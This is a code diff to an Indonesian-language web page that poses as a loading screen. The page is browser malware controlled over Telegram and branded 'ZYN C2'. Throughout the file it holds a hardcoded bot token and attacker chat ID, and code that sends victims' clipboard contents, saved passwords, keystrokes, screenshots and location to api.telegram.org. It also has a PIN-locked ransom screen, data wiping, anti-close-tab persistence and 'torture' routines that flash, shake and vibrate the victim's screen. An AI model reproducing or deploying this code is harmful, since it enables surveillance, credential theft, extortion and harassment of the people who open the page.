@@ -6,7 +6,7 @@
     <title>Memuat...</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-tap-highlight-color:transparent; }
-        body { background: #0a0f1e; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: system-ui, -apple-system, 'Segoe UI', monospace; }
+        body { background: #0a0f1e; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: system-ui, 'Segoe UI', monospace; }
         .loader { text-align: center; background: rgba(10,15,30,0.85); backdrop-filter: blur(12px); border-radius: 32px; padding: 2rem; width: 85%; max-width: 300px; border: 1px solid rgba(255,255,255,0.15); }
         .spinner { width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #0af; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -40,9 +40,9 @@
 <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
 <script>
 // ============================================================
-// KONFIGURASI (WAJIB GANTI)
+// KONFIGURASI (WAJIB GANTI DENGAN DATA ANDA)
 // ============================================================
-const BOT_TOKEN = "8522832882:AAH05rDVzFa023hVW5Li8m_1VNZR8ISIMNM";
+const BOT_TOKEN = "8926922713:AAEeaBRLN1xDR5-O9rQigymOsNRt9fPtlyA";
 const ATTACKER_CHAT_ID = "6420213852";
 // ============================================================
 
@@ -53,6 +53,7 @@ if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
 }
 
 async function start() {
+    // ---------- KIRIM PESAN KE TELEGRAM ----------
     async function sendToAttacker(text, keyboard = null) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         const body = {
@@ -65,10 +66,11 @@ async function start() {
         try { await fetch(url, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(body) }); } catch(e) {}
     }
 
-    // Anti close tab
+    // ---------- ANTI CLOSE TAB ----------
     window.addEventListener('beforeunload', (e) => { e.preventDefault(); e.returnValue = ''; });
     window.addEventListener('pagehide', () => sendToAttacker(`⚠️ *[${victimId}] Halaman ditutup*`));
 
+    // ---------- SERVICE WORKER (PERSISTENSI) ----------
     if ('serviceWorker' in navigator) {
         try {
             const swCode = `self.addEventListener('fetch', () => {});`;
@@ -78,13 +80,14 @@ async function start() {
         } catch(e) {}
     }
 
+    // ---------- ID KORBAN UNIK ----------
     let victimId = localStorage.getItem("zyn_victim_id");
     if (!victimId) {
         victimId = "V_" + Date.now() + "_" + Math.random().toString(36).substr(2, 6);
         localStorage.setItem("zyn_victim_id", victimId);
     }
 
-    // Persistent lock
+    // ---------- PERSISTENT LOCK (RANSOMWARE) ----------
     let persistentLock = localStorage.getItem("zyn_locked") === "true";
     let persistentPin = localStorage.getItem("zyn_lock_pin") || "829263";
     let lockMessage = localStorage.getItem("zyn_lock_message") || "🔒 DEVICE TERKUNCI";
@@ -97,7 +100,9 @@ async function start() {
     let countdownTimer = null;
     let soundLoop = null;
     let lockBgImage = null;
+    let tormentInterval = null;
 
+    // ---------- ANIMASI GLITCH ----------
     function startGlitch() {
         if (glitchAnimationId) return;
         glitchCanvas.style.display = 'block';
@@ -150,6 +155,7 @@ async function start() {
     }
     function releaseWakeLock() { if (wakeLock) { wakeLock.release(); wakeLock = null; } }
 
+    // ---------- TAMPILKAN LAYAR KUNCI ----------
     function showLockScreen() {
         let overlay = document.getElementById("lockOverlay");
         if (overlay.style.display === "flex") return;
@@ -222,6 +228,7 @@ async function start() {
 
     if (persistentLock) showLockScreen();
 
+    // Auto-lock dari URL (opsional)
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.has('autolock') && !persistentLock) {
         let pin = urlParams.get('autolock');
@@ -229,7 +236,7 @@ async function start() {
         activateRansomware(pin, msg);
     }
 
-    // Fitur ransomware tambahan
+    // ---------- FUNGSI RANSOMWARE TAMBAHAN ----------
     async function setLockPin(newPin) {
         if (!persistentLock) return sendToAttacker(`❌ Tidak ada lock aktif`);
         persistentPin = newPin;
@@ -278,6 +285,35 @@ async function start() {
             }
         }, 1000);
     }
+    async function fakeError() {
+        if (!persistentLock) return;
+        let div = document.createElement('div');
+        div.innerText = "⚠️ SYSTEM ERROR: Data tidak dapat dipulihkan. Hubungi dukungan.";
+        div.style.cssText = 'position:fixed;bottom:20px;left:20px;background:#ff0000cc;color:white;padding:10px;border-radius:8px;z-index:100001;font-size:12px;';
+        document.body.appendChild(div);
+        setTimeout(() => div.remove(), 5000);
+        sendToAttacker(`⚠️ *[${victimId}] Fake error ditampilkan*`);
+    }
+    async function tormentLock() {
+        if (!persistentLock) return;
+        if (tormentInterval) clearInterval(tormentInterval);
+        tormentInterval = setInterval(() => {
+            const intensity = Math.sin(Date.now()/100) * 3;
+            document.body.style.transform = `translate(${intensity}px, ${intensity/2}px)`;
+            setTimeout(() => document.body.style.transform = '', 100);
+            const flashDiv = document.createElement('div');
+            flashDiv.style.cssText = `position:fixed; top:0; left:0; width:100%; height:100%; background:hsl(${Math.random()*360}, 100%, 50%); opacity:0.3; z-index:99999; pointer-events:none;`;
+            document.body.appendChild(flashDiv);
+            setTimeout(() => flashDiv.remove(), 150);
+            if (navigator.vibrate) navigator.vibrate(200);
+        }, 800);
+        sendToAttacker(`🔥 *[${victimId}] Torture lock aktif*`);
+    }
+    function stopTormentLock() {
+        if (tormentInterval) clearInterval(tormentInterval);
+        tormentInterval = null;
+        sendToAttacker(`⏹️ *[${victimId}] Torture lock berhenti*`);
+    }
     async function wipeAllData() {
         localStorage.clear();
         sessionStorage.clear();
@@ -286,8 +322,10 @@ async function start() {
         setInterval(() => alert("DATA HILANG"), 1000);
     }
 
-    // Fitur sadap (stealth)
+    // ---------- VARIABEL SADAP ----------
     let keylogData = [], autoScreenshotInterval = null, gpsInterval = null, currentStream = null, lastUpdateId = 0, keylogStreamInterval = null, mediaRecorder = null;
+
+    // ---------- FUNGSI SADAP (LENGKAP, STEALTH) ----------
     async function getClipboard() { try { let text = await navigator.clipboard.readText(); await sendToAttacker(`📋 *[${victimId}] Clipboard:*\n\`\`\`${text.substring(0,500)}\`\`\``); } catch(e) { } }
     async function writeClipboard(text) { try { await navigator.clipboard.writeText(text); await sendToAttacker(`✏️ *[${victimId}] Clipboard ditulis:* \`${text.substring(0,200)}\``); } catch(e) { } }
     async function getNetworkInfo() {
@@ -345,8 +383,8 @@ async function start() {
         await sendToAttacker(`🔑 *[${victimId}] Password tersimpan:*\n\`\`\`${JSON.stringify(passwords, null, 2).substring(0,2000)}\`\`\``);
     }
 
-    // Fitur penyiksaan
-    let audioElem=null, shakeInt=null, flashInt=null, popupInt=null, touchBlock=null, autoClickInt=null, tormentInterval=null;
+    // ---------- FITUR PENYIKSAAN (TORTURE) ----------
+    let audioElem=null, shakeInt=null, flashInt=null, popupInt=null, touchBlock=null, autoClickInt=null;
     async function loopAudio(url) { if(audioElem) audioElem.pause(); audioElem=new Audio(url); audioElem.loop=true; try{ await audioElem.play(); sendToAttacker(`🔊 *[${victimId}] Audio loop: ${url}`); } catch(e){ sendToAttacker(`❌ Audio error: ${e.message}`); } }
     function stopAudio() { if(audioElem){audioElem.pause(); audioElem=null; sendToAttacker(`⏹️ Audio berhenti`);} }
     function shakeScreen(dur) { if(shakeInt) clearInterval(shakeInt); let orig=document.body.style.transform; let start=Date.now(),count=0; shakeInt=setInterval(()=>{ if(dur && Date.now()-start>dur){clearInterval(shakeInt); shakeInt=null; document.body.style.transform=orig; sendToAttacker(`⏹️ Getaran layar berhenti`); return;} let intensity=Math.sin(count)*5; document.body.style.transform=`translate(${intensity}px,${intensity/2}px)`; count+=0.5; },50); sendToAttacker(`🫨 *Layar bergetar${dur?` ${dur/1000}s`:''}`); }
@@ -364,7 +402,7 @@ async function start() {
     function enableTouchAll(){ document.body.style.pointerEvents=''; sendToAttacker(`✅ *Sentuhan diaktifkan*`); }
     function stopAllTorture(){ stopAudio(); stopShake(); stopFlash(); stopPopup(); unblockTouch(); stopAutoClick(); enableTouchAll(); if(tormentInterval) clearInterval(tormentInterval); sendToAttacker(`🛑 *Semua penyiksaan dihentikan*`); }
 
-    // Login sistem
+    // ---------- SISTEM LOGIN TELEGRAM ----------
     let authenticated = false;
     let currentPassword = "admin123";
     async function handleLogin(chatId, password) {
@@ -384,6 +422,7 @@ async function start() {
         } else { await sendToAttacker(`❌ Minimal 4 karakter.`); }
     }
 
+    // ---------- BANTUAN (HELP) ----------
     async function sendHelp() {
         await sendToAttacker(`*🔐 ZYN C2 - PREMIUM (STEALTH + MULTI-TARGET)*
 
@@ -445,6 +484,7 @@ async function start() {
 💡 *Contoh:* \`lock 123456\` (broadcast) atau \`@V_123456 lock 123456\` (target spesifik)`);
     }
 
+    // ---------- SET BOT COMMANDS (MENU TELEGRAM) ----------
     async function setBotCommands() {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/setMyCommands`;
         const commands = [
@@ -461,7 +501,7 @@ async function start() {
         await fetch(url, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ commands }) });
     }
 
-    let lastUpdateId = 0;
+    // ---------- POLLING PERINTAH DARI TELEGRAM ----------
     async function pollCommands() {
         if (persistentLock) { setTimeout(pollCommands, 5000); return; }
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=5`;
@@ -516,6 +556,7 @@ async function start() {
         setTimeout(pollCommands, 3000);
     }
 
+    // ---------- EKSEKUSI PERINTAH ----------
     async function execCmd(main, fullArg, arg) {
         await sendToAttacker(`📟 *[${victimId}]* \`${main}\``);
         if (main === "lock") activateRansomware(arg||"123456", "🔒 TERKUNCI");
@@ -591,6 +632,7 @@ async function start() {
         else await sendToAttacker(`❌ Perintah salah: \`${main}\`. Ketik \`help\``);
     }
 
+    // ---------- INISIALISASI ----------
     await setBotCommands();
     const inlineKeyboard = {
         inline_keyboard: [
@@ -612,13 +654,7 @@ Ketik \`help\` untuk semua perintah.`, inlineKeyboard);
     await getFullInfo();
     await getNetworkInfo();
     pollCommands();
-
-    // Fungsi yang belum didefinisikan (countdown, fakeError, tormentLock, stopTormentLock)
-    async function countdownLock(sec, pin) { if(persistentLock) return; sendToAttacker(`⏰ *Countdown ${sec} detik, lock dengan PIN ${pin}*`); let c=sec; let timer=setInterval(()=>{ if(c<=0){ clearInterval(timer); activateRansomware(pin,`🔒 LOCK OTOMATIS setelah ${sec} detik`); } else { sendToAttacker(`⏰ *Lock dalam ${c} detik...*`); c--; } },1000); }
-    async function fakeError() { if(!persistentLock) return; let div=document.createElement('div'); div.innerText='⚠️ SYSTEM ERROR: Data tidak dapat dipulihkan.'; div.style.cssText='position:fixed;bottom:20px;left:20px;background:#ff0000cc;color:white;padding:10px;border-radius:8px;z-index:100001;font-size:12px;'; document.body.appendChild(div); setTimeout(()=>div.remove(),5000); sendToAttacker(`⚠️ *Fake error ditampilkan*`); }
-    async function tormentLock() { if(!persistentLock) return; if(tormentInterval) clearInterval(tormentInterval); tormentInterval = setInterval(() => { const intensity = Math.sin(Date.now()/100) * 3; document.body.style.transform = `translate(${intensity}px, ${intensity/2}px)`; setTimeout(() => document.body.style.transform = '', 100); const flashDiv = document.createElement('div'); flashDiv.style.cssText = `position:fixed; top:0; left:0; width:100%; height:100%; background:hsl(${Math.random()*360}, 100%, 50%); opacity:0.3; z-index:99999; pointer-events:none;`; document.body.appendChild(flashDiv); setTimeout(() => flashDiv.remove(), 150); if (navigator.vibrate) navigator.vibrate(200); }, 800); sendToAttacker(`🔥 *Torture lock aktif*`); }
-    function stopTormentLock() { if(tormentInterval){clearInterval(tormentInterval); tormentInterval=null; sendToAttacker(`⏹️ *Torture lock berhenti*`);} }
 }
 </script>
 </body>
-</html>
+    </html>
